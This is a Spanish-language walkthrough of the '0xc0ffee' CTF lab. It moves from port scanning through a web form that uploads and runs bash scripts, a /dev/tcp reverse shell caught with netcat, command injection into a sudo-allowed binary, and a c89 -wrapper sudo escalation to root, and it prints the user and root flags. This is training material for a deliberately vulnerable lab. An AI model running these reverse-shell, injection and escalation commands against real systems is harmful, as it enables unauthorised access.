---
icon: flag
---

# CTF 0xc0ffee Intermediate

URL Download CTF = [https://drive.google.com/file/d/19CO1Fvs-CDi6rmmTsbh0mN2DOdnO-T8x/view?usp=sharing](https://drive.google.com/file/d/19CO1Fvs-CDi6rmmTsbh0mN2DOdnO-T8x/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip 0xc0ffee.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh 0xc0ffee.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.20.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 07:51 EDT
Nmap scan report for 172.20.0.2
Host is up (0.000031s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Security Verification Tool
7777/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
MAC Address: 02:42:AC:14:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.48 seconds
```

Vemos que hay una pagina web y despues un servidor de `python3` abierto en el puerto `7777`, si vamos al servidor de `python3` veremos muchos archivos pero entre ellos una carpeta llamada `secret` que si entramos en ella, veremos un archivo llamado `history.txt` y contiene lo siguiente.

```
En los albores del siglo XXI, EspaÃ±a se encontraba en medio de una revoluciÃ³n tecnolÃ³gica, donde las sombras de los servidores y el resplandor de las pantallas digitales eran el campo de batalla para los mÃ¡s astutos y habilidosos. Entre ellos, habÃ­a un nombre que resonaba con reverencia y misterio: Ãlvaro LÃ³pez. Conocido en la comunidad cibernÃ©tica como â€œEl Fantasma de Madridâ€, Ãlvaro era considerado el mejor hacker de EspaÃ±a, y su habilidad para penetrar los sistemas mÃ¡s seguros era casi legendaria.

Ãlvaro comenzÃ³ su andanza en el mundo de la ciberseguridad desde una edad temprana. Lo que comenzÃ³ como un simple interÃ©s en la informÃ¡tica se transformÃ³ en una pasiÃ³n por desentraÃ±ar los secretos mÃ¡s ocultos de las redes y sistemas de seguridad. Su habilidad para encontrar vulnerabilidades en sistemas aparentemente impenetrables le ganÃ³ una reputaciÃ³n que se extendÃ­a mÃ¡s allÃ¡ de las fronteras de EspaÃ±a.

Uno de los incidentes mÃ¡s notorios en la carrera de Ãlvaro ocurriÃ³ cuando se enfrentÃ³ a uno de los desafÃ­os mÃ¡s complejos de su vida. Un banco internacional de renombre, conocido por su nivel extremo de seguridad, habÃ­a sido blanco de un ataque, y el misterio giraba en torno a un archivo encriptado con la etiqueta "super_secure_password". Este archivo contenÃ­a informaciÃ³n crÃ­tica sobre las transacciones de alto valor, y su protecciÃ³n era de mÃ¡xima prioridad.

El banco habÃ­a desplegado una red de seguridad impenetrable, con capas de cifrado y autenticaciÃ³n de mÃºltiples factores, lo que hizo que el reto fuera aÃºn mÃ¡s emocionante para Ãlvaro. Tras semanas de investigaciÃ³n y anÃ¡lisis de los sistemas, el Fantasma de Madrid descubriÃ³ una pequeÃ±a pero crÃ­tica vulnerabilidad en el protocolo de encriptaciÃ³n utilizado. Con una mezcla de astucia y tÃ©cnica avanzada, pudo realizar un ataque sofisticado que permitiÃ³ descifrar el contenido protegido bajo el "super_secure_password".

Sin embargo, el talento de Ãlvaro no radicaba solo en su capacidad para hackear sistemas; tambiÃ©n era un maestro en la Ã©tica de la ciberseguridad. En lugar de utilizar la informaciÃ³n para sus propios fines, utilizÃ³ su acceso para alertar al banco sobre las fallas en su sistema y proporcionar recomendaciones para mejorar la seguridad. Su acto no solo demostrÃ³ su habilidad tÃ©cnica, sino tambiÃ©n su integridad y compromiso con la seguridad digital.

La hazaÃ±a de Ãlvaro LÃ³pez pronto se convirtiÃ³ en una leyenda en el mundo de la ciberseguridad. El banco, agradecido por su valiosa contribuciÃ³n, lo recompensÃ³ generosamente y lo invitÃ³ a colaborar en la mejora de sus sistemas de seguridad. La historia de El Fantasma de Madrid se convirtiÃ³ en un ejemplo de cÃ³mo la habilidad y la Ã©tica pueden coexistir en el mundo del hacking.

Con el tiempo, Ãlvaro siguiÃ³ influyendo en el campo de la ciberseguridad, ofreciendo conferencias y talleres sobre la importancia de la protecciÃ³n de datos y la Ã©tica en el hacking. Su legado perdurÃ³, y su nombre se convirtiÃ³ en sinÃ³nimo de excelencia en el arte de la ciberseguridad, recordado como el mejor hacker que EspaÃ±a habÃ­a conocido.
```

Vemos que se repite varias veces la palabra `super_secure_password` y si nos vamos a la pagina web del puerto `80` vemos que tenemos que meter una palabra, por lo que probaremos con esa.

Si la metemos veremos que es la correcta y nos redirigira a otra pagina web en la que podemos crear una configuracion del sistema y despues mas abajo como ejecutarla por asi decirlo.

## Segunda pagina de configuracion

Si probamos a poner como nombre en la seccion `Configuration Identifier` por ejemplo `test1.sh`

Y en su contenido le metemos:

```shell
#!/bin/bash

echo 'Probando test1.sh'
```

Le daremos al boton de `Apply Configuration` y veremos que se nos creo un archivo con ese contenido, por que si nos vamos al servidor de `python3` veremos que el archivo esta ahi subido y con el contenido que le metimos, ahora si vamos a ejecutar esa "configuracion" en la opcion de abajo llamada `Execute Remote Configuration` ponemos el nombre del archivo `test1.sh` y le damos al boton `Fetch Configuration`, por lo que vemos que nos ejecuto correctamente e interpreta codigo bash, por lo que haremos lo siguiente.

## Reverse Shell

Crearemos un archivo de la misma forma llamado `shell.sh` y con el siguiente contenido:

```shell
#!/bin/bash

sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Info:

```
Configuración 'shell.sh' aplicada con éxito.
```

Le damos al boton de `Apply Configuration` y ahora veremos que se creo correctamente, por lo que seguidamente antes de ejecutarlo en la opcion de abajo estaremos a la escucha.

```shell
nc -lvnp <PORT>
```

Y nos vamos a la pagina web, en la opcion de `Execute Remote Configuration` ponemos el nombre del archivo en mi caso `shell.sh` y le damos al boton `Fetch Configuration`, ahora si nos vamos a donde teniamos la escucha veremos que se nos creo una shell con el usuario `www-data`.

Info:

```
connect to [192.168.5.145] from (UNKNOWN) [172.20.0.2] 54068
sh: 0: can't access tty; job control turned off
$
```

Ahora sanitizaremos la shell (TTY):

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user codebad

Si nos vamos a la `/home` del usuario `codebad` veremos los siguiente.

```
total 44
drwxr-xr-x 3 codebad  codebad   4096 Aug 29 13:22 .
drwxr-xr-x 1 root     root      4096 Aug 29 11:41 ..
-rw------- 1 codebad  codebad      5 Aug 29 13:22 .bash_history
-rw-r--r-- 1 codebad  codebad    220 Aug 29 11:39 .bash_logout
-rw-r--r-- 1 codebad  codebad   3771 Aug 29 11:39 .bashrc
-rw-r--r-- 1 codebad  codebad    807 Aug 29 11:39 .profile
-rwxr-xr-x 1 metadata metadata 16176 Aug 29 12:16 code
drwxr-xr-x 2 root     root      4096 Aug 29 11:49 secret
```

Si nos metemos en la carpeta `secret/` veremos un archivo llamado `adivina.txt` que dice lo siguiente.

```
Adivinanza

En el mundo digital, donde la protección es vital,
existe algo peligroso que debes evitar.
No es un virus común ni un simple error,
sino algo más sutil que trabaja con ardor.

Es el arte de lo malo, en el software es su reino,
se oculta y se disfraza, su propósito es el mismo.
No es virus, ni gusano, pero se comporta igual,
toma su nombre de algo que no es nada normal.

¿Qué soy?
```

La respuesta a esta adivinanza es la palabra `malware` por lo que posiblemente sea la contraseña del usuario `codebad`.

```shell
su codebad
```

Y si metemos como contraseña la palabra `malware` veremos que es su contraseña y ya seremos dicho usuario.

## Escalate user metadata

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for codebad on a6c7dc66c5c1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User codebad may run the following commands on a6c7dc66c5c1:
    (metadata : metadata) NOPASSWD: /home/codebad/code
```

Vemos que podemos ejecutar como `metadata` el binario `code`, por lo que haremos lo siguiente.

```shell
sudo -u metadata /home/codebad/code
```

Info:

```
Usage: /home/codebad/code <options>
```

Vemos que necesita un `input` por lo que le pondremos algo.

```shell
sudo -u metadata /home/codebad/code 'hola'
```

Info:

```
/bin/ls: cannot access 'hola': No such file or directory
```

Vemos que por detras se esta ejecutando un `ls`, probaremos a poner `-la`.

```shell
sudo -u metadata /home/codebad/code '-la'
```

Info:

```
total 44
drwxr-xr-x 3 codebad  codebad   4096 Aug 29 13:22 .
drwxr-xr-x 1 root     root      4096 Aug 29 11:41 ..
-rw------- 1 codebad  codebad      5 Aug 29 13:22 .bash_history
-rw-r--r-- 1 codebad  codebad    220 Aug 29 11:39 .bash_logout
-rw-r--r-- 1 codebad  codebad   3771 Aug 29 11:39 .bashrc
-rw-r--r-- 1 codebad  codebad    807 Aug 29 11:39 .profile
-rwxr-xr-x 1 metadata metadata 16176 Aug 29 12:16 code
drwxr-xr-x 2 root     root      4096 Aug 29 11:49 secret
```

Vemos que funciona, por lo que intentaremos concatenar comandos a ver si funciona.

```shell
sudo -u metadata /home/codebad/code '-la; whoami'
```

Info:

```
total 44
drwxr-xr-x 3 codebad  codebad   4096 Aug 29 13:22 .
drwxr-xr-x 1 root     root      4096 Aug 29 11:41 ..
-rw------- 1 codebad  codebad      5 Aug 29 13:22 .bash_history
-rw-r--r-- 1 codebad  codebad    220 Aug 29 11:39 .bash_logout
-rw-r--r-- 1 codebad  codebad   3771 Aug 29 11:39 .bashrc
-rw-r--r-- 1 codebad  codebad    807 Aug 29 11:39 .profile
-rwxr-xr-x 1 metadata metadata 16176 Aug 29 12:16 code
drwxr-xr-x 2 root     root      4096 Aug 29 11:49 secret
metadata
```

Vemos que funciona por lo que obtendremos una shell del usuario `metadata` de la siguiente forma.

```shell
sudo -u metadata /home/codebad/code '-la; bash -i'
```

Y si ahora hacemos `whoami`.

```shell
metadata
```

Veremos que somos el usuario `metadata` por lo que leeremos la flag.

> user.txt

```
f5d22841e337cab01739e59cce3275e9
```

## Escalate Privileges

Si hacemos `sudo -l` veremos que necesitaremos una contraseña, por lo que buscaremos a ver donde puede haber alguna pista.

Si vamos a `/usr/local/bin` veremos un binario llamado `metadatosmalos` con un contenido que no importa mucho y los permisos normales, por lo que probaremos a meter como contraseña el nombre del binario.

```shell
sudo -l
```

Metemos como contraseña `metadatosmalos` y veremos que funciona.

```
Matching Defaults entries for metadata on a6c7dc66c5c1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User metadata may run the following commands on a6c7dc66c5c1:
    (ALL : ALL) /usr/bin/c89
```

Vemos que podemos ejecutar como `root` el binario `c89` por lo que haremos lo siguiente.

URL = https://gtfobins.github.io/gtfobins/c89/#sudo

```shell
sudo c89 -wrapper /bin/sh,-s .
```

Y con esto ya seremos `root`, por lo que leeremos la flag.

> root.txt

```
d6c4a33bec66ea2948f09a0db32335de
```
